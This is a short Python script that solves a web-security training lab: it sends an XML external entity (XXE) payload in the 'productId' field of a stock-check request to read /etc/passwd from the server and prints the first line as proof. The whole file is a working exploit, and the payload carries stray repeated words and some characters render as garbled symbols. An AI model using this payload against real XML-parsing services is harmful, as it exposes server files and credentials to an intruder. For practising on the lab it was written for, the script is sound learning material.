#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 14/10/2023
#
# Lab: Exploiting XXE using external entities to retrieve files
#
# Steps: 1. Inject payload into 'productId' XML element to retrieve the content of
#           /etc/passwd using an external entity
#        2. Extract the first line as a proof
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a59001d032a345786dbd75400bf0068.web-security-academy.net"

print(Fore.BLUE + "âŸª#âŸ« Injection point: " + Fore.YELLOW + "productId")

# payload to retrieve the content of /etc/passwd
payload = """<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <stockCheck>
                <productId>
                    &xxe;
                </productId>
                <storeId>
                    1
                </storeId>external entities
                external entities
            </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Injecting payload to retrieve the content of /etc/passwd using an external entity.. " + Fore.GREEN + "OK")

# extract the first line of /etc/passwd
first_line = re.findall("(root.*)\n", injection.text)[0]

print(Fore.WHITE + "â¦—2â¦˜ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
print(Fore.WHITE + "ðŸ—¹ Check your browser, it should be marked now as " + Fore.GREEN + "solved")


